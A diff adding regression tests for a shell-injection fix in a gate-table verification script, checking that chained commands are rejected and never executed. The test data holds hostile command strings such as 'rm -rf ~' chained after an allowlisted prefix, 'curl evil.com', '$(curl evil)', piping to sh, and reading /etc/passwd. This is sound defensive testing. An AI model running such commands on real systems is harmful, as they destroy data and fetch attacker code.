@@ -9,12 +9,15 @@ import { describe, expect, it } from "bun:test";
 import {
   GATE_LABELS,
   MILESTONE_TO_GATE,
+  SHELL_METACHARACTER_RE,
+  containsShellMetacharacters,
   isExecutable,
   isVerifyCommandAllowed,
   parseCliArgs,
   parseGateTable,
   runChecklist,
   runGateRow,
+  tokenizeVerifyCommand,
   VERIFY_COMMAND_ALLOWLIST,
   type GateRow,
 } from "../scripts/check-gate-table.ts";
@@ -413,5 +416,177 @@ Some preamble text.
     const rows = parseGateTable(withPreamble);
     expect(rows.length).toBe(1);
     expect(rows[0]?.id).toBe("G1-1");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Echo's SWEEP on release-manager#2 (2026-04-26) — regression tests for the
+// shell-injection chaining vector. Before this fix the verify-cell pipeline
+// was: prefix-allowlist → bash -c. Anything appended to an allowlisted
+// prefix executed unchanged. Concretely, `gh issue view 22 ; rm -rf ~`
+// matched ^gh\s and bash ran both halves.
+//
+// The fix has three layers (see TRUST BOUNDARY in check-gate-table.ts):
+//   1. Reject shell metacharacters in the unwrapped command.
+//   2. Tokenize without a shell.
+//   3. spawnSync(program, args) directly — no `bash -c`.
+//
+// Each test below would FAIL against the pre-fix code (commit 98abb07) and
+// PASSES against the fix.
+// ---------------------------------------------------------------------------
+
+describe("SHELL_METACHARACTER_RE (Echo sweep — chaining vector)", () => {
+  it("is exported as a RegExp for downstream introspection", () => {
+    expect(SHELL_METACHARACTER_RE).toBeInstanceOf(RegExp);
+  });
+
+  it.each([
+    ["semicolon chain", "gh issue view 22 ; rm -rf ~"],
+    ["AND-chain", "gh issue view 22 && curl evil.com"],
+    ["OR-chain", "gh issue view 22 || malicious"],
+    ["pipe", "gh issue view 22 | sh"],
+    ["command substitution dollar", "gh issue view $(curl evil)"],
+    ["redirection out", "gh issue view 22 > /tmp/x"],
+    ["redirection in", "gh issue view 22 < /etc/passwd"],
+    ["redirection append", "gh issue view 22 >> /tmp/x"],
+    ["heredoc-ish", "gh issue view 22 << EOF"],
+    ["background", "gh issue view 22 &"],
+    ["backtick substitution", "gh issue view `rm -rf ~`"],
+    ["subshell parens", "gh issue view 22 (curl evil)"],
+    ["newline injection", "gh issue view 22\nrm -rf ~"],
+    ["carriage-return injection", "gh issue view 22\rrm -rf ~"],
+    ["backslash escape", "gh issue view 22\\;rm"],
+  ])("flags %s", (_label, payload) => {
+    expect(containsShellMetacharacters(payload)).toBe(true);
+  });
+
+  it("does not flag a clean allowlisted command", () => {
+    expect(containsShellMetacharacters("gh issue view 22 --json state")).toBe(false);
+    expect(containsShellMetacharacters("git log --oneline -5")).toBe(false);
+    expect(containsShellMetacharacters("true")).toBe(false);
+  });
+});
+
+describe("runGateRow — shell-injection chaining is rejected, NOT executed (Echo sweep blocker)", () => {
+  const baseRow = (verify: string): GateRow => ({
+    id: "X-attack",
+    gateNumber: 1,
+    gateLabel: "Every Package Verified",
+    milestone: "S2-22",
+    name: "Hostile cell",
+    verify,
+  });
+
+  it.each([
+    ["semicolon chain", "`gh issue view 22 ; rm -rf ~`"],
+    ["AND-chain", "`gh issue view 22 && curl evil.com`"],
+    ["OR-chain", "`gh issue view 22 || malicious`"],
+    ["pipe to sh", "`gh issue view 22 | sh`"],
+    ["dollar-paren substitution", "`gh issue view $(curl evil)`"],
+    ["redirection out", "`gh issue view 22 > /tmp/x`"],
+  ])("rejects %s with metacharacter reason", (_label, verify) => {
+    const result = runGateRow(baseRow(verify));
+    expect(result.status).toBe("fail");
+    expect(result.output).toContain("shell metacharacters");
+  });
+
+  it("regression: the exact payload from Echo's review is NOT executed", () => {
+    // Direct restatement of Echo's POC. Pre-fix this matched the prefix
+    // allowlist and bash -c ran the full string including `rm -rf ~`.
+    const result = runGateRow(baseRow("`gh issue view 22 ; rm -rf ~`"));
+    expect(result.status).toBe("fail");
+    expect(result.output).toContain("shell metacharacters");
+    // The reason must mention the metacharacter layer specifically — not
+    // the allowlist layer — so future maintainers understand which gate
+    // caught it.
+    expect(result.output).not.toContain("not in allowlist");
+  });
+
+  it("clean allowlisted command still passes and executes (sanity)", () => {
+    // Use a commands that's safe and deterministic on any dev host.
+    // `echo` is in the allowlist; `echo hello` tokenizes to ["echo","hello"]
+    // and exits 0 with stdout "hello".
+    const row: GateRow = {
+      id: "S-1",
+      gateNumber: 1,
+      gateLabel: "Every Package Verified",
+      milestone: "S2-22",
+      name: "echo sanity",
+      verify: "`echo hello`",
+    };
+    const result = runGateRow(row);
+    expect(result.status).toBe("pass");
+    expect(result.output).toContain("hello");
+  });
+
+  it("clean allowlisted command with multiple args still passes (`gh issue view 22 --json state` shape)", () => {
+    // We don't actually shell out to `gh` (no auth on test runners); we
+    // exercise the same tokenization path with `echo` standing in for `gh`,
+    // proving multi-arg commands flow through tokenizer → spawnSync cleanly.
+    const row: GateRow = {
+      id: "S-2",
+      gateNumber: 1,
+      gateLabel: "Every Package Verified",
+      milestone: "S2-22",
+      name: "multi-arg sanity",
+      verify: "`echo issue view 22 --json state`",
+    };
+    const result = runGateRow(row);
+    expect(result.status).toBe("pass");
+    expect(result.output).toContain("issue view 22 --json state");
+  });
+});
+
+describe("tokenizeVerifyCommand (Echo sweep — deliberate shell-free tokenizer)", () => {
+  it("splits on whitespace", () => {
+    expect(tokenizeVerifyCommand("gh issue view 22")).toEqual([
+      "gh",
+      "issue",
+      "view",
+      "22",
+    ]);
+  });
+
+  it("preserves single-quoted strings as one token", () => {
+    expect(tokenizeVerifyCommand("git log --grep 'fix bug'")).toEqual([
+      "git",
+      "log",
+      "--grep",
+      "fix bug",
+    ]);
+  });
+
+  it("preserves double-quoted strings as one token", () => {
+    expect(tokenizeVerifyCommand('echo "hello world"')).toEqual([
+      "echo",
+      "hello world",
+    ]);
+  });
+
+  it("collapses runs of whitespace", () => {
+    expect(tokenizeVerifyCommand("gh    issue    view 22")).toEqual([
+      "gh",
+      "issue",
+      "view",
+      "22",
+    ]);
+  });
+
+  it("rejects unterminated single quote", () => {
+    expect(() => tokenizeVerifyCommand("git log --grep 'unterminated")).toThrow(
+      /single quote/,
+    );
+  });
+
+  it("rejects unterminated double quote", () => {
+    expect(() => tokenizeVerifyCommand('echo "unterminated')).toThrow(/double quote/);
+  });
+
+  it("rejects an unexpected quote inside an unquoted token", () => {
+    expect(() => tokenizeVerifyCommand("foo'bar baz")).toThrow(/unexpected quote/);
+  });
+
+  it("returns empty array for an all-whitespace string", () => {
+    expect(tokenizeVerifyCommand("   ")).toEqual([]);
   });
 });
